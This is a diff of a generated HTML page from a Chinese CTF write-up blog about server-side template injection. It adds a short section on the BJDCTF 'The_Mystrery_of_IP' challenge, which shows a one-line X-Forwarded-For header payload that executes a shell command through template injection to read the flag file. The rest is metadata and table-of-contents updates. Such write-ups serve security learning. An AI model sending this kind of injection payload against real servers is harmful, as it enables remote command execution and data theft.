@@ -82,14 +82,15 @@
 
 
 
-<meta name="description" content="ciscn 华东南赛区 Double Secret 超过四位的字符加密会报错, 报错信息中可以看到部分源码  将要加密的东西换成%ff, 又爆出了源码  是一个rc4 加解密的程序, rc4加密和解密流程是一样的, 流程大概就是将secret进行一个加密或者解密之后然后渲染输出, 然后密钥也给了, 那么只要把payload用rc4加密一下发送过去就行了 SCTF 2019 flag shop ro">
+<meta name="description" content="2020 BJDCTF The_Mystrery_of_IP 题目会获取ip并在页面上显示  测试发现xff可以控制这里显示的ip. 模板注入 1X-Forwarded-For: &amp;#123;&amp;#123;system(&amp;quot;cat /flag&amp;quot;)&amp;#125;&amp;#125; ciscn 华东南赛区 Double Secret 超过四位的字符加密会报错, 报错信息中可以看到部分源码  将">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSTI 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/05/27/SSTI/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="ciscn 华东南赛区 Double Secret 超过四位的字符加密会报错, 报错信息中可以看到部分源码  将要加密的东西换成%ff, 又爆出了源码  是一个rc4 加解密的程序, rc4加密和解密流程是一样的, 流程大概就是将secret进行一个加密或者解密之后然后渲染输出, 然后密钥也给了, 那么只要把payload用rc4加密一下发送过去就行了 SCTF 2019 flag shop ro">
+<meta property="og:description" content="2020 BJDCTF The_Mystrery_of_IP 题目会获取ip并在页面上显示  测试发现xff可以控制这里显示的ip. 模板注入 1X-Forwarded-For: &amp;#123;&amp;#123;system(&amp;quot;cat /flag&amp;quot;)&amp;#125;&amp;#125; ciscn 华东南赛区 Double Secret 超过四位的字符加密会报错, 报错信息中可以看到部分源码  将">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/image-20200130182744898.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200121164528251.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200121164628693.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20191231170305900.png">
@@ -102,11 +103,11 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511254-b561a580-aa28-11e9-8e54-c89fcf20690b.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511291-ce6a5680-aa28-11e9-8525-0c66dd03c840.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57853604-c1f33300-7818-11e9-8665-a592056576e0.png">
-<meta property="og:updated_time" content="2020-01-21T09:14:09.525Z">
+<meta property="og:updated_time" content="2020-01-30T10:30:08.212Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSTI 题型记录[working forever]">
-<meta name="twitter:description" content="ciscn 华东南赛区 Double Secret 超过四位的字符加密会报错, 报错信息中可以看到部分源码  将要加密的东西换成%ff, 又爆出了源码  是一个rc4 加解密的程序, rc4加密和解密流程是一样的, 流程大概就是将secret进行一个加密或者解密之后然后渲染输出, 然后密钥也给了, 那么只要把payload用rc4加密一下发送过去就行了 SCTF 2019 flag shop ro">
-<meta name="twitter:image" content="http://yoursite.com/images/image-20200121164528251.png">
+<meta name="twitter:description" content="2020 BJDCTF The_Mystrery_of_IP 题目会获取ip并在页面上显示  测试发现xff可以控制这里显示的ip. 模板注入 1X-Forwarded-For: &amp;#123;&amp;#123;system(&amp;quot;cat /flag&amp;quot;)&amp;#125;&amp;#125; ciscn 华东南赛区 Double Secret 超过四位的字符加密会报错, 报错信息中可以看到部分源码  将">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20200130182744898.png">
 
 
 
@@ -346,8 +347,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2020-01-21T17:14:09+08:00">
-                2020-01-21
+              <time title="Post modified" itemprop="dateModified" datetime="2020-01-30T18:30:08+08:00">
+                2020-01-30
               </time>
             
           </span>
@@ -433,7 +434,13 @@
       
 
       
-        <h2 id="ciscn-华东南赛区-Double-Secret">ciscn 华东南赛区 Double Secret</h2>
+        <h2 id="2020-BJDCTF-The-Mystrery-of-IP">2020 BJDCTF The_Mystrery_of_IP</h2>
+<p>题目会获取ip并在页面上显示</p>
+<p><img src="/images/image-20200130182744898.png" alt="image-20200130182744898"></p>
+<p>测试发现xff可以控制这里显示的ip.</p>
+<p>模板注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-华东南赛区-Double-Secret">ciscn 华东南赛区 Double Secret</h2>
 <p>超过四位的字符加密会报错, 报错信息中可以看到部分源码</p>
 <p><img src="/images/image-20200121164528251.png" alt="image-20200121164528251"></p>
 <p>将要加密的东西换成%ff, 又爆出了源码</p>
@@ -613,7 +620,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">45</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -705,7 +712,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-华东南赛区-Double-Secret"><span class="nav-number">1.</span> <span class="nav-text">ciscn 华东南赛区 Double Secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SCTF-2019-flag-shop"><span class="nav-number">2.</span> <span class="nav-text">SCTF 2019 flag shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web11"><span class="nav-number">3.</span> <span class="nav-text">CISCN2019 华东南赛区 Web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018护网杯easy-tornado"><span class="nav-number">4.</span> <span class="nav-text">2018护网杯easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#百度杯-Fuzz"><span class="nav-number">5.</span> <span class="nav-text">百度杯 Fuzz</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-BJDCTF-The-Mystrery-of-IP"><span class="nav-number">1.</span> <span class="nav-text">2020 BJDCTF The_Mystrery_of_IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-华东南赛区-Double-Secret"><span class="nav-number">2.</span> <span class="nav-text">ciscn 华东南赛区 Double Secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SCTF-2019-flag-shop"><span class="nav-number">3.</span> <span class="nav-text">SCTF 2019 flag shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web11"><span class="nav-number">4.</span> <span class="nav-text">CISCN2019 华东南赛区 Web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018护网杯easy-tornado"><span class="nav-number">5.</span> <span class="nav-text">2018护网杯easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#百度杯-Fuzz"><span class="nav-number">6.</span> <span class="nav-text">百度杯 Fuzz</span></a></li></ol></div>
             
 
           </div>
@@ -739,7 +746,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">72.2k</span>
+    <span title="Site words total count">74.1k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
